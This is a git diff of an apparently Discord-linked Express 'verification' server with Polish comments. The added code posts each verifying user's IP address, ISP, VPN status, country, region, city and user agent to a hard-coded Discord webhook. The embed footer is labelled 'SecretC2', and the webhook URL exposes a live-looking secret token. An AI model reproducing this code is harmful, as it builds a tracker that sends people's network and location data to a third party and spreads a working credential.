@@ -6,7 +6,7 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// Przechowywanie kodów z przypisanym userId
+// Przechowywanie kodów (prosta mapa)
 const validCodes = new Map();
 
 // Funkcja do info o IP
@@ -51,14 +51,20 @@ app.post('/api/register-code', (req, res) => {
     return res.status(400).json({ error: 'Brak danych' });
   }
   
-  // Zapisz kod z przypisanym userId
+  // Kod ważny 15 minut
   validCodes.set(code, {
     userId: userId,
     expires: Date.now() + 15 * 60 * 1000
   });
   
-  console.log(`✅ Kod ${code} zarejestrowany dla użytkownika ${userId}`);
+  // Czyść stare kody
+  for (let [key, value] of validCodes.entries()) {
+    if (value.expires < Date.now()) {
+      validCodes.delete(key);
+    }
+  }
   
+  console.log(`✅ Kod ${code} zarejestrowany dla ${userId}`);
   res.json({ success: true });
 });
 
@@ -259,25 +265,26 @@ app.post('/api/verify', async (req, res) => {
   const { code, userId } = req.body;
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   
-  console.log(`🔍 Próba weryfikacji: code=${code}, userId=${userId}`);
+  console.log(`🔍 Próba weryfikacji: code=${code}, userId=${userId}, ip=${clientIp}`);
   
   if (!code || !userId) {
     return res.json({ success: false, message: 'Brak kodu lub userId' });
   }
   
-  // Sprawdź czy kod istnieje
+  // Sprawdź czy kod istnieje i jest ważny
   const stored = validCodes.get(code);
   if (!stored) {
+    console.log(`❌ Kod ${code} nie istnieje`);
     return res.json({ success: false, message: 'Nieprawidłowy kod!' });
   }
   
-  // Sprawdź czy kod należy do tego użytkownika
   if (stored.userId !== userId) {
-    return res.json({ success: false, message: 'Ten kod nie należy do Ciebie!' });
+    console.log(`❌ Kod ${code} należy do innego użytkownika (${stored.userId} != ${userId})`);
+    return res.json({ success: false, message: 'Kod nie pasuje do tego użytkownika!' });
   }
   
-  // Sprawdź czy kod nie wygasł
   if (stored.expires < Date.now()) {
+    console.log(`❌ Kod ${code} wygasł`);
     validCodes.delete(code);
     return res.json({ success: false, message: 'Kod wygasł!' });
   }
@@ -289,8 +296,9 @@ app.post('/api/verify', async (req, res) => {
   // Pobierz info o IP
   const ipInfo = await getIPInfo(clientIp);
   
-  // Wyślij informację do bota przez webhook
+  // === WAŻNE: Wyślij informację do bota przez webhook ===
   try {
+    // Webhook, który bot nasłuchuje (ten sam co w VERIFY_LOG_CHANNEL_ID)
     await axios.post('https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z', {
       content: JSON.stringify({
         type: 'verification',
@@ -302,6 +310,38 @@ app.post('/api/verify', async (req, res) => {
     console.log(`📤 Wysłano webhook do bota dla ${userId}`);
   } catch (error) {
     console.error('❌ Błąd wysyłania webhooka do bota:', error.message);
+  }
+  
+  // Wyślij też ładny embed na kanał logów
+  try {
+    await axios.post('https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z', {
+      embeds: [{
+        title: '✅ Nowa weryfikacja',
+        color: 0x00ff00,
+        fields: [
+          { name: 'Użytkownik', value: `<@${userId}> (${userId})`, inline: false },
+          { name: '📡 NETWORK INFORMATION', value: 
+            `**IP:** ${ipInfo.ip}\n` +
+            `**ISP:** ${ipInfo.isp}\n` +
+            `**VPN:** ${ipInfo.vpn}`, inline: false
+          },
+          { name: '📍 LOCATION', value:
+            `**Kraj:** ${ipInfo.country}\n` +
+            `**Region:** ${ipInfo.region}\n` +
+            `**Miasto:** ${ipInfo.city}`, inline: false
+          },
+          { name: '💻 DEVICE INFORMATION', value:
+            `**Urządzenie:** ${req.headers['user-agent']?.substring(0, 50) || 'Nieznane'}\n` +
+            `**Provider:** ${ipInfo.isp}\n` +
+            `**Typ:** ${ipInfo.type}`, inline: false
+          }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: { text: 'SecretC2 - System weryfikacji' }
+      }]
+    });
+  } catch(e) {
+    console.error('Błąd webhooka embed:', e.message);
   }
   
   res.json({ 
